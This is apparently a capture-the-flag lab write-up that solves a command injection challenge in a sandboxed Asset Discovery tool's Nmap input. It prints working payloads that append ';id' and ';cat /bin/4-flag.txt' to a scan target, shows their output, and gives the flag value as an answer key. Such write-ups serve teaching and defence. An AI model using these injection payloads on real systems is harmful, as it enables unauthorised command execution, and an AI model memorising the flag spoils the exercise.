# Task 4. Map vulnerabilities, find hidden flags!

## **Task Description**


### Time to map out vulnerabilities with nmap! Can you sneak past our defenses and unearth those open ports?


Welcome to the next level of your cybersecurity adventure! We're taking our Asset Discovery tool up a notch by integrating nmap for open port checks. But have we secured it enough

Nmap Time! Ready for a New Challenge? 🕵️‍

This challenge focuses on exploiting a command injection vulnerability within the nmap input.

Target Application: Asset Discovery tool \
Initial Endpoint: http://web0x09.hbtn/app5/

Useful instructions:
1. Log into Asset Discovery tool.
2. The nmap input is vulnerable.
3. We can try and give it an input (127.0.0.1:8080 for example).
4. Flag Location /bin/4-flag.txt

You can work with this Script: [https://gtfobins.org/gtfobins/nmap/#file-download](https://gtfobins.org/gtfobins/nmap/#file-download)

Repo:

GitHub repository: dlh-cyber_security \
Directory: web_application_security/0x09_command_injection \
File: 4-flag.txt




## **Solution**



- Start sandbox `cyber_websec_0x09`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.129.101 web0x09.hbtn" | sudo tee -a /etc/hosts
sudo vim /etc/hosts
ping -c 2 web0x09.hbtn
```

## **Task 4: Command Injection via Nmap**

**Target:** [http://web0x09.hbtn/app5/]([http://web0x09.hbtn/app5/)\
**Flag location:** `/bin/4-flag.txt`

This challenge introduces a new attack surface: the application's **Nmap input**.

Nmap also has a documented `-iL` option that can expose local file contents through parsing errors. We can explore that technique if direct command injection is restricted.

[https://gtfobins.org/gtfobins/nmap/](https://gtfobins.org/gtfobins/nmap/)



### **Step 1: Test command injection**

Log into App 5, navigate to the Nmap functionality, and enter:

```
127.0.0.1 -p 8080;id
```

**Why this payload?**

- `127.0.0.1 -p 8080` matches the application's expected host-and-port format.
- `;` attempts to terminate the original shell command.
- `id` checks whether an additional command executes.

If successful, we should see output resembling:

```
uid=996(lab05) gid=996(lab05) groups=996(lab05)
```

**Output**:
```
Scan results

Starting Nmap 7.93 ( https://nmap.org ) at 2026-11-13 21:58 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00014s latency).

PORT     STATE  SERVICE
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
uid=995(lab05) gid=995(lab05) groups=995(lab05)
```

**Step 1 successful. Command injection confirmed.**

The output confirms that `;id` executed successfully after the Nmap scan.

- **Execution user:** `lab05` (UID 995)
- **Injection operator:** `;`
- **Vulnerability:** OS Command Injection

### **Step 2: Retrieve the flag**

Since direct command injection works, we can attempt to read the flag without using Nmap's file-reading features.

Enter this payload in the **Nmap input**:

```
127.0.0.1 -p 8080;cat /bin/4-flag.txt
```

**How it works:**

1. `127.0.0.1 -p 8080` executes a legitimate Nmap scan.
2. `;` separates the scan from our injected command.
3. `cat /bin/4-flag.txt` attempts to display the flag.


**Output**:
```
Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
FLAG_4 45932f68282190b06f42e17c58447cec
```

&#x20;Task 4 completed

Successfully exploited command injection through the Nmap input and retrieved the flag.

### **Flag obtained**

**FLAG_4**

`45932f68282190b06f42e17c58447cec`

### **Successful payload**

```
127.0.0.1 -p 8080;cat /bin/4-flag.txt
```

### **Technical summary**

| Property                 | Result               |
| ------------------------ | -------------------- |
| Vulnerability            | OS Command Injection |
| Target                   | `/app5/`             |
| Vulnerable functionality | Nmap scan input      |
| Injection operator       | `;`                  |
| Execution context        | `lab05` (UID 995)    |
| Flag location            | `/bin/4-flag.txt`    |
| Outcome                  | Successful           |

### **Why the exploit worked**

The application passed user-controlled scan parameters to a shell without preventing command separators from being interpreted.

The shell therefore executed two independent commands:

```
nmap 127.0.0.1 -p 8080
cat /bin/4-flag.txt
```

**Key insight:** Nmap itself did not need to be vulnerable. The security flaw was in how the application invoked Nmap.

The challenge's suggested GTFOBins technique was unnecessary because direct shell command injection already provided access to the flag.

### Step 3: Save the Flag

```bash
echo "45932f68282190b06f42e17c58447cec" > 4-flag.txt
git add .
git commit -m "4-flag.txt"
git push
```

